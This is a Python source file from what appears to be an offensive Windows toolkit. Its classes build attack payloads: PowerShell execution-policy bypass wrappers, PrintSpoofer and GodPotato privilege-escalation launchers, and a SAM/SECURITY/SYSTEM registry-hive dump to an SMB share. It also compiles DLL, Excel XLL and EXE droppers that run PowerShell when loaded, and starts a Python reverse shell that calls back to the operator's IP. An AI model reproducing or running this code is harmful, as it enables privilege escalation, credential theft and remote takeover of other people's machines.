from io import BytesIO
import os
import subprocess
import zipfile

from stolen_tools.steal_tools import provide_godpotato, provide_printspoofer, provide_python_interpreter
from silly_python_payloads import reverse_shell_file

"""Payloads take a file and wrap it into another file!! 
EXCEPTION: PowershellFileRunner DOES NOT CREATE A POWERSHELL FILE!!
This is a huge fucking mess and looked better on the whiteboard than in reality!"""


class Payload:
    ext = ""

    def __init__(self, smb_server_object, make_file=True, input_files=None):
        self.smb_server_object = smb_server_object
        self.payload = ""
        self.output_files = []
        self.input_files = input_files if input_files else []
        self.file = None
        self.generate()
        if make_file:
            self.file = self.smb_server_object.create_temp_file(content=self.payload, ext=self.ext)

    def generate(self):
        self.payload = "NotImplemented!!"

    def await_output_files(self, timeout=None):
        for output_file in self.output_files:
            output_file.await_me(timeout=timeout)
        

class PowershellFileRunner(Payload):
    """Run an EXISTING powershell file THIS DOES NOT CREATE A FILE!"""
    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, False, input_files)

    def generate(self):
        if self.payload:
            return
        self.payload = f"powershell.exe -ep bypass -file {self.input_files[0].remote_path}"


class PrintSpoofer(Payload):
    ext = ".ps1"

    def generate(self):
        if self.payload:
            return
        print_spooofer_exe = self.smb_server_object.create_temp_file(provide_printspoofer(), ext=".exe")
        runner = PowershellFileRunner(self.smb_server_object, [self.input_files[0]])
        print_spoofer = f'{print_spooofer_exe.remote_path} -c "{runner.payload}"'
        self.payload = print_spoofer

class GodPotato(Payload):
    ext = ".ps1"
    def generate(self):
        god_potato_exe = self.smb_server_object.create_temp_file(provide_godpotato(), ext=".exe")
        runner = PowershellFileRunner(self.smb_server_object, [self.input_files[0]])
        potato = f'{god_potato_exe.remote_path} -cmd "{runner.payload}"'
        self.payload = potato


class SamDumpPowershell(Payload):
    """FOR WHATEVER REASON reg save cant write to smbv2 shares?! sometimes"""
    ext = ".ps1"

    def generate(self):
        if self.payload:
            return
        self.sam = self.smb_server_object.future_file()
        self.security = self.smb_server_object.future_file()
        self.system = self.smb_server_object.future_file()
        self.output_files += [self.sam, self.security, self.system]
        powershell_command = f"reg save hklm\\sam {self.sam.remote_path}\nreg save hklm\\security {self.security.remote_path}\nreg save hklm\\system {self.system.remote_path}"
        if self.smb_server_object.credentials:
            powershell_command = self.smb_server_object.net_use_string() + "\n" + powershell_command
        self.payload = powershell_command


class CRunPowershellDll(Payload):
    ext = ".dll"
    compiler = "/usr/bin/x86_64-w64-mingw32-gcc"

    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, make_file=False, input_files=input_files)

    def generate(self):
        self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
        powershell = PowershellFileRunner(self.smb_server_object, self.input_files)
        self.payload = '#include <windows.h>\n\nBOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved){switch (ul_reason_for_call){case DLL_PROCESS_ATTACH:system("'
        self.payload += powershell.payload
        self.payload += '");break;default:break;}return TRUE;}'
        with subprocess.Popen([self.compiler, "-shared", "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
            process.communicate(input=self.payload.encode())


class CRunPowershellXll(Payload):
    ext = ".xll"
    compiler = "/usr/bin/x86_64-w64-mingw32-gcc"

    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, make_file=False, input_files=input_files)

    def generate(self):
        self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
        powershell = PowershellFileRunner(self.smb_server_object, self.input_files)
        self.payload = '#include <windows.h>\n\nvoid xlAutoOpen() {system("'
        self.payload += powershell.payload
        self.payload += '");}'
        with subprocess.Popen([self.compiler, "-shared", "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
            process.communicate(input=self.payload.encode())

class CRunPowershellExe(Payload):
    """Run an EXISTING powershell file inside an exe"""
    ext = ".exe"
    compiler = "/usr/bin/x86_64-w64-mingw32-gcc"

    def __init__(self, smb_server_object, input_files):
        super().__init__(smb_server_object, make_file=False, input_files=input_files)

    def generate(self):
        self.file = self.smb_server_object.create_temp_file(content="placeholder because gcc cant compile to stdout", ext=self.ext)
        powershell = PowershellFileRunner(self.smb_server_object, self.input_files)
        self.payload = '#include <stdlib.h>\n\nvoid main(int argc, char *argv[]){system("'
        self.payload += powershell.payload
        self.payload += '");}'
        with subprocess.Popen([self.compiler, "-o", self.file.local_path, "-xc", "-"], stdin=subprocess.PIPE) as process:
            process.communicate(input=self.payload.encode())

class SillyPythonPayload:
    def __init__(self, smb_server_object, reverse_shell_port):
        self.port = reverse_shell_port
        self.smb_server = smb_server_object
        with zipfile.ZipFile(BytesIO(provide_python_interpreter()), "r") as zipped:
            zipped.extractall(smb_server_object.smb_dir)
        self.interpreter = smb_server_object.create_temp_file_from_file(os.path.join(smb_server_object.smb_dir, "python.exe"))
        self.reverse_shell = smb_server_object.create_temp_file_from_file(reverse_shell_file)


    def __str__(self):
        return f"{self.interpreter.remote_path_backslashes} -I {self.reverse_shell.remote_path_backslashes} {self.smb_server.local_ip} {self.port}"
